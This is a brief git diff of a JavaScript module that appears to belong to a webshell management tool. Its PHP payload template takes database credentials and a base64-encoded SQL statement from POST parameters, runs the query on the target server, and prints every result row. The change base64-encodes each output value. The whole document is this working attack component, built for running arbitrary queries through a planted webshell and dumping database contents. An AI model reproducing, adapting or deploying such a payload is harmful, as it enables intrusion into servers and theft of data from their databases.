@@ -39,7 +39,7 @@ module.exports = {
   // 执行SQL语句
   query: {
     _:
-      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$T=@mysqli_connect($hst,$usr,$pwd);@mysqli_query($T,"SET NAMES ${arg6}");@mysqli_select_db($T,$dbn);$q=@mysqli_query($T,$sql);$i=0;while($col=@mysqli_fetch_field($q)){echo($col->name."\t|\t");$i++;}echo("\r\n");while($rs=@mysqli_fetch_row($q)){for($c=0;$c<$i;$c++){echo(trim($rs[$c]));echo("\t|\t");}echo("\r\n");}@mysqli_close($T);`,
+      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$T=@mysqli_connect($hst,$usr,$pwd);@mysqli_query($T,"SET NAMES ${arg6}");@mysqli_select_db($T,$dbn);$q=@mysqli_query($T,$sql);$i=0;while($col=@mysqli_fetch_field($q)){echo($col->name."\t|\t");$i++;}echo("\r\n");while($rs=@mysqli_fetch_row($q)){for($c=0;$c<$i;$c++){echo(base64_encode(trim($rs[$c])));echo("\t|\t");}echo("\r\n");}@mysqli_close($T);`,
     [arg1]: '#{host}',
     [arg2]: '#{user}',
     [arg3]: '#{passwd}',
